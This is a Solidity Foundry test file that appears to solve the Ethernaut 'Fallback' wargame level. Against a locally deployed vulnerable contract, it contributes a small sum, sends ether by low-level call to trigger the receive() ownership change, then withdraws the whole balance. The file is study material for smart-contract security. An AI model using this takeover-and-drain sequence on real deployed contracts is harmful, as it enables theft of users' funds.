pragma solidity >=0.6.0 <0.9.0;
import "forge-std/Test.sol";
import {Fallback} from "../src/01-fallback.sol";

// malicious function from receive() function
contract FallBack01Test is Test {
    Fallback fback;

    function setUp() public {
        emit log_string("🧪 Setup Fallback...");
        address bob = mkaddr("bob");
        vm.prank(bob);
        fback = new Fallback();
        emit log_named_address("At first, the owner is: ", fback.owner());
        emit log_named_address("Test contract address is: ", address(this));
    }

    function testFallback() public {
        emit log_string("🧪 Cracking Fallback...");
        address alice = mkaddr("alice");
        vm.deal(alice, 100 ether);
        emit log_named_uint("Alice balance is: ", alice.balance);

        vm.startPrank(alice);
        // fback.contribute{value: 0.0001 ether}();  //for slolidity version 0.8
        fback.contribute.value(1000_000)(); // for solidity version v0.6.0
        emit log_named_uint("Alice contribution is: ", fback.getContribution());

        //@audit here can not use transfer or send function
        // payable(fback).transfer(0.001 ether);
        // because receive() will change storage variable, will cost more thant 2300 stipend
        // so here must use the low level call function
        // (bool success, ) = address(fback).call{value: 1 ether}("");  // for solidity version v0.8.0
        (bool success, ) = address(fback).call.value(1000_000_000)(""); // for solidity version 0.6.0
        require(success);

        fback.withdraw();
        vm.stopPrank();
        emit log_string("🧪 Cracking End...");

        emit log_named_uint(
            "At end, the balance of fallback is: ",
            address(fback).balance
        );
        emit log_named_address("Owner change to: ", fback.owner());
    }

    function mkaddr(string memory name) public returns (address) {
        address addr = address(
            uint160(uint256(keccak256(abi.encodePacked(name))))
        );
        vm.label(addr, name);
        return addr;
    }
}
